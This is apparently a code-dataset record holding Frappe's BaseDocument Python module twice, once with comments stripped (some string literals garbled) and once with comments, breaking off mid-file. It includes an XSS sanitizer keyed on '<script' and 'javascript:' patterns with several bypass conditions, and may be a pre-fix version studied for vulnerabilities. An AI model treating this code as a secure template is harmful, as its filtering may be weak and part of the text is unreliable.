datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn 